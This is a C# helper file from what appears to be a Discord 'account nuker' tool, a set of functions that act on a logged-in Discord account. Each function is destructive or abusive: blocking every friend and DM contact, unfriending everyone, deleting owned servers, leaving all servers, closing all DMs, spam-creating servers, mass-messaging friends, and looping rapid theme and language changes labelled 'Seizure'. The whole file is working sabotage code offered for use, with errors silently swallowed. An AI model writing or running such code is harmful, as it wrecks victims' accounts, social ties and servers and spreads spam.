using Discord;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Kyanite_Account_Nuker.Helpers
{
    public class Features
    {
        public static async Task BlockEveryone(DiscordClient client)
        {
            try
            {
                foreach (DiscordRelationship discordRelationship in RelationshipsExtensions.GetRelationships(client))
                {
                    discordRelationship.User.BlockAsync();
                    Methods.info("Blocked: " + discordRelationship.User.Username);
                }
                foreach (PrivateChannel privateChannel in DMChannelExtensions.GetPrivateChannels(client))
                {
                    foreach (DiscordUser discordUser in privateChannel.Recipients)
                    {
                        discordUser.BlockAsync();
                        try
                        {
                            Methods.info("Blocked: " + discordUser.Username);
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }
        }

        public static async Task BlockFriends(DiscordClient client)
        {
            try
            {
                foreach (DiscordRelationship discordRelationship in RelationshipsExtensions.GetRelationships(client))
                {
                    discordRelationship.User.BlockAsync();
                    Methods.info("Blocked: " + discordRelationship.User.Username);
                }
            }
            catch
            {
            }
        }

        public static async Task UnfriendEveryone(DiscordClient client)
        {
            try
            {
                foreach (DiscordRelationship discordRelationship in RelationshipsExtensions.GetRelationships(client))
                {
                    discordRelationship.User.RemoveRelationshipAsync();
                    Methods.info("Unfriended: " + discordRelationship.User.Username);
                }
            }
            catch
            {
            }
        }

        public static async Task SpamGuilds(DiscordClient client, string name, int amt)
        {
            try
            {
                foreach (int i in Enumerable.Range(0, amt))
                {
                    client.CreateGuildAsync(name);
                    Methods.info("Created Guild: " + name);
                }
            }
            catch
            {

            }
        }

        public static async Task DeleteGuilds(DiscordClient client)
        {
            if (client.GetGuilds().Count > 0)
            {

                foreach (PartialGuild guild in client.GetGuilds())
                {
                    try
                    {
                        guild.DeleteAsync();
                        Methods.info("Deleted Guild: " + guild.Name);
                    }
                    catch
                    {
                    }
                }
            }
            else
            {
                Methods.info("No Servers Found.");
            }

        }

        public static async Task LeaveServers(DiscordClient client)
        {
            foreach (PartialGuild guild in client.GetGuilds())
            {
                try
                {
                    guild.LeaveAsync();
                    Methods.info("Left Guild: " + guild.Name);
                }
                catch
                {
                }
            }
        }

        public static async Task CloseDMS(DiscordClient client)
        {
            foreach (PrivateChannel privateChannel in DMChannelExtensions.GetPrivateChannels(client))
            {
                try
                {
                    new Thread(() => privateChannel.Delete()).Start();

                    Methods.info("Closed Chat: " + privateChannel.Id.ToString());
                }
                catch
                {
                }
            }
        }

        public static async Task MassDMFriends(DiscordClient client, string Message)
        {
            foreach (DiscordRelationship privateChannel in RelationshipsExtensions.GetRelationships(client))
            {
                try
                {
                    privateChannel.User.Client.SendMessage(privateChannel.User.Id, Message);
                    Methods.info("Sent Chat: " + privateChannel.User.Username.ToString());
                }
                catch
                {
                }
            }
        }

        public static async Task Seizure(DiscordClient client)
        {
            var random = new Random();
            var Languagez = new List<DiscordLanguage> { DiscordLanguage.EnglishUK, DiscordLanguage.Chinese, DiscordLanguage.French, DiscordLanguage.Romanian
            ,DiscordLanguage.Russian,DiscordLanguage.Danish,DiscordLanguage.Japanese,DiscordLanguage.Spanish,DiscordLanguage.Ukranian
            ,DiscordLanguage.Hungarian};

            try
            {
                for (;; )
                {
                    await Task.Delay(400);
                    _ = client.User.ChangeSettingsAsync(new UserSettingsProperties
                    {
                        Theme = (DiscordTheme)1,
                        Language = (DiscordLanguage)random.Next(Languagez.Count),
                        CompactMessages = true,
                        EnableTts = true,
                        EmbedAttachments = true,
                        DeveloperMode = true
                    });
                    _ = client.User.ChangeSettingsAsync(new UserSettingsProperties
                    {
                        Theme = (DiscordTheme)0,
                        Language = (DiscordLanguage)random.Next(Languagez.Count),
                        CompactMessages = false,
                        EnableTts = false,
                        EmbedAttachments = false,
                        DeveloperMode = false
                    });
                }
            }
            catch
            {
            }
        }

    }
}
